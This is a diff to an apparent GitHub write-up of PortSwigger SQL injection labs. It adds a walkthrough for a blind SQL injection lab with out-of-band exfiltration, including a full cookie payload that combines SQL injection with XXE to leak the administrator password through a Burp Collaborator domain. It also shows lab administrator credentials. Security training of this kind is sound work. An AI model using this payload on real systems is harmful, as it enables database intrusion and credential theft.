@@ -620,7 +620,7 @@ To solve the lab, log in as the administrator user.
 
 ![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/69ad3c39-7306-488d-b365-5b88a05e400a)
 
-![Uploading image.png…]()
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/4cee38ab-561f-49e0-b2e1-6974065a0802)
 
 username : administrator 
 password : uq0k0oca9y9s2l2off6e
@@ -660,8 +660,34 @@ The solution described here is sufficient simply to trigger a DNS lookup and so 
 
 ![WhatsApp Image 2023-06-26 at 18 48 59](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/0066a881-9870-41f4-84e3-d0fe8cd4863e)
 
-**Lab: Blind SQL injection with out-of-band data exfiltration**
 ![WhatsApp Image 2023-06-26 at 18 52 27](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/86f2f223-7217-41c7-b644-8a8cbb3ed6d0)
 
 ![WhatsApp Image 2023-06-26 at 18 52 56](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/49eb5881-da0e-44b6-8eae-e641aef7bae4)
+
+**Lab #17: Blind SQL injection with out-of-band data exfiltration**
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user.
+
+Visit the front page of the shop, and use Burp Suite Professional to intercept and modify the request containing the TrackingId cookie.
+Modify the TrackingId cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
+
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie.
+Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.
+You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the administrator user should appear in the subdomain of the interaction, and you can view this within the Collaborator tab. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.
+In the browser, click "My account" to open the login page. Use the password to log in as the administrator user.
+
+![WhatsApp Image 2023-06-29 at 08 43 18](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/2f1328a6-4db3-428d-ace9-821a23ee823d)
+
+![WhatsApp Image 2023-06-29 at 08 43 41](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/6a0d703e-d190-4404-9702-574a53a17123)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/aa77d23c-58bb-4300-ad4e-8b6baf8ce5f2)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/b9b11634-a5aa-4c05-b842-30de0a0d1141)
 
